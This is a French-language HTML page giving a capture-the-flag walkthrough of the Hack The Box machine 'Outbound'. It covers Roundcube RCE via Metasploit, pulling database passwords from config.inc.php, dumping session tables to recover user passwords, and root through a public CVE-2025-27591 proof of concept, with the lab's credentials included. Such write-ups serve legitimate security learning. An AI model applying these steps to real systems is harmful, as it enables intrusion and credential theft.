@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Outbound | Writeup</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Outbound" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Any writeup outbound?" />
+<meta property="og:description" content="Any writeup outbound?" />
+<link rel="canonical" href="/HTB/outbound.html" />
+<meta property="og:url" content="/HTB/outbound.html" />
+<meta property="og:site_name" content="Writeup" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-11-06T17:47:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Outbound" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-11-06T17:47:00+01:00","datePublished":"2025-11-06T17:47:00+01:00","description":"Any writeup outbound?","headline":"Outbound","mainEntityOfPage":{"@type":"WebPage","@id":"/HTB/outbound.html"},"url":"/HTB/outbound.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="preload" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&display=swap" as="style" type="text/css" crossorigin>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <a id="skip-to-content" href="#content">Skip to the content.</a>
+
+    <header class="page-header" role="banner">
+      <h1 class="project-name">Outbound</h1>
+      <h2 class="project-tagline">Any writeup outbound?</h2>
+      
+      
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="enumeration">Enumeration</h1>
+
+<p>On commence avec les credentials <code class="language-plaintext highlighter-rouge">tyler:LhKL1o9Nm3X2</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LhKL1o9Nm3X2
+</code></pre></div></div>
+
+<p>On est instantanément redirigé vers le site <code class="language-plaintext highlighter-rouge">mail.outbound.htb</code> sur lequel on voit une page de connexion.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/outbound%20images/Pasted%20image%2020251106183415.png"></span></p>
+
+<p>On se connecte et on se trouve sur une page de webmail.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/outbound%20images/Pasted%20image%2020251106183824.png"></span></p>
+
+<p>En cliquant sur about on obtient la version du serveur de mail <code class="language-plaintext highlighter-rouge">Roundcube Webmail 1.6.10</code>.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/outbound%20images/Pasted%20image%2020251106183801.png"></span></p>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>On trouve une CVE qui nous permet de faire une RCE sur cette exacte version</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/outbound%20images/Pasted%20image%2020251106184055.png"></span></p>
+
+<p>(Pour une raison quelconque je n’ai pas réussi à l’exploiter)</p>
+
+<p>On peut aussi passer par msfconsole</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>search roundcube
+use 0
+show options
+set username tyler
+set password LhKL1o9Nm3X2
+set LHOST
+</code></pre></div></div>
+<p>On remplit les options <code class="language-plaintext highlighter-rouge">RHOST</code>, <code class="language-plaintext highlighter-rouge">username</code>, <code class="language-plaintext highlighter-rouge">password</code> et <code class="language-plaintext highlighter-rouge">LHOST</code>.</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/outbound%20images/Pasted%20image%2020251106192104.png"></span></p>
+
+<p>Et enfin on lance l’exploit.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run
+</code></pre></div></div>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/outbound%20images/Pasted%20image%2020251106192142.png"></span></p>
+
+<p>On peut récupérer un shell en utilisant la commande</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shell
+</code></pre></div></div>
+
+<p>Normalement on peut stabiliser le shell mais pour une raison quelconque on a pas python</p>
+
+<h1 id="pivoting--lateral-movement">Pivoting / Lateral movement</h1>
+
+<p>Une fois le shell obtenu, on change simplement pour l’utilisateur tyler avec le mot de passe</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LhKL1o9Nm3X2
+</code></pre></div></div>
+
+<p>En regardant dans le dossier dans lequel on arrive en obtenant le shell on trouve un dossier config dans lequel on trouve des fichiers de configuration nous indiquant qu’une db mysql tourne sur un port:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls -la
+ls -la config
+cat /var/www/html/roundcube/config/config.inc.php
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
+</code></pre></div></div>
+
+<p>On tente alors de dump les infos intéressantes en se connectant à la db mais la table users ne nous donne rien:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e "select * from users;" -E
+</code></pre></div></div>
+<p>On obtient</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*************************** 1. row ***************************
+             user_id: 1
+            username: jacob
+           mail_host: localhost
+             created: 2025-06-07 13:55:18
+          last_login: 2025-11-06 17:54:41
+        failed_login: 2025-06-11 07:51:32
+failed_login_counter: 1
+            language: en_US
+         preferences: a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}
+*************************** 2. row ***************************
+             user_id: 2
+            username: mel
+           mail_host: localhost
+             created: 2025-06-08 12:04:51
+          last_login: 2025-06-08 13:29:05
+        failed_login: NULL
+failed_login_counter: NULL
+            language: en_US
+         preferences: a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}
+*************************** 3. row ***************************
+             user_id: 3
+            username: tyler
+           mail_host: localhost
+             created: 2025-06-08 13:28:55
+          last_login: 2025-11-06 21:46:21
+        failed_login: 2025-06-11 07:51:22
+failed_login_counter: 1
+            language: en_US
+         preferences: a:2:{s:11:"client_hash";s:16:"t8jhbK8JFyC4Xvv8";i:0;b:0;}
+
+</code></pre></div></div>
+
+<p>on tente avec les sessions et on obtient quelque chose d’intéressant</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e "select * from session;" -E
+</code></pre></div></div>
+<p>On obtient</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*************************** 5. row ***************************
+sess_id: 6a5ktqih5uca6lj8vrmgh9v0oh
+changed: 2025-06-08 15:46:40
+     ip: 172.17.0.1
+   vars: bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudC
+</code></pre></div></div>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/outbound%20images/Pasted%20image%2020251107010102.png"></span></p>
+
+<p>Que l’on déchiffre, avec l’aide de hashes.com en:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7:language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";
+</code></pre></div></div>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/outbound%20images/Pasted%20image%2020251107010212.png"></span></p>
+
+<p>On obtient le mot de passe de jacob</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>595mO8DmwGeD
+</code></pre></div></div>
+
+<p>On regarde les docs dans le home de jacob et on trouve un document intéressant, un mail qu’il a reçu.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /home/jacob/mail/INBOX/jacob
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>From tyler@outbound.htb  Sat Jun 07 14:00:58 2025                                                                                                                                                                                           
+Return-Path: &lt;tyler@outbound.htb&gt;                                                                                                                                                                                                           
+X-Original-To: jacob                                                                                                                                                                                                                        
+Delivered-To: jacob@outbound.htb                                                                                                                                                                                                            
+Received: by outbound.htb (Postfix, from userid 1000)                                                                                                                                                                                       
+        id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)                                                                                                                                                                               
+To: jacob@outbound.htb
+Subject: Important Update
+MIME-Version: 1.0
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+Message-Id: &lt;20250607140058.B32C410248D@outbound.htb&gt;
+Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
+From: tyler@outbound.htb
+X-IMAPbase: 1749304753 0000000002
+X-UID: 1
+Status: 
+X-Keywords:                                                                       
+Content-Length: 233
+
+Due to the recent change of policies your password has been changed.
+
+Please use the following credentials to log into your account: gY4Wr3a1evp4
+
+Remember to change your password when you next log into your account.
+
+Thanks!
+
+Tyler
+
+From mel@outbound.htb  Sun Jun 08 12:09:45 2025
+Return-Path: &lt;mel@outbound.htb&gt;
+X-Original-To: jacob
+Delivered-To: jacob@outbound.htb
+Received: by outbound.htb (Postfix, from userid 1002)
+        id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
+To: jacob@outbound.htb
+Subject: Unexpected Resource Consumption
+MIME-Version: 1.0
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+Message-Id: &lt;20250608120945.1487E22C@outbound.htb&gt;
+Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
+From: mel@outbound.htb
+X-UID: 2
+Status: 
+X-Keywords:                                                                       
+Content-Length: 261
+
+We have been experiencing high resource consumption on our main server.
+For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
+Please inform us immediately if you notice any irregularities.
+
+Thanks!
+
+Mel
+
+</code></pre></div></div>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/outbound%20images/Pasted%20image%2020251107010659.png"></span></p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/outbound%20images/Pasted%20image%2020251107010547.png"></span></p>
+
+<p>En lisant le mail on trouve un mot de passe pour Jacob.</p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<p>Ayant trouvé le mot de passe pour jacob, on réessaye un ssh et cette fois on obtient bien une connexion.</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/outbound%20images/Pasted%20image%2020251107011614.png"></span></p>
+
+<p>Une fois sur la machine on peut déjà récupérer user.txt. Ensuite on lance la commande classique</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
+</code></pre></div></div>
+<p>et on trouve un résultat intéressant: on a accès à un fichier: <code class="language-plaintext highlighter-rouge">/usr/bin/below</code>.</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/outbound%20images/Pasted%20image%2020251107011742.png"></span></p>
+
+<p>On regarde les CVE et on trouve un post facebook qui nous explique comment la cve existe
+https://www.facebook.com/security/advisories/cve-2025-27591</p>
+
+<p>On cherche encore un peu et on trouve un repo git qui nous dit comment exploiter cette CVE.
+https://github.com/BridgerAlderson/CVE-2025-27591-PoC</p>
+
+<p>On télécharge donc le fichier exploit.py sur la machine victime et on le lance avec</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py
+</code></pre></div></div>
+
+<p>Et juste comme ça on obtient notre root shell!</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/outbound%20images/Pasted%20image%2020251107012624.png"></span></p>
+
+<p>Et  voilà, la box est finie</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/outbound%20images/Pasted%20image%2020251112181319.png"></span></p>
+
+
+      <footer class="site-footer">
+        
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
+      </footer>
+    </main>
+  </body>
+</html>
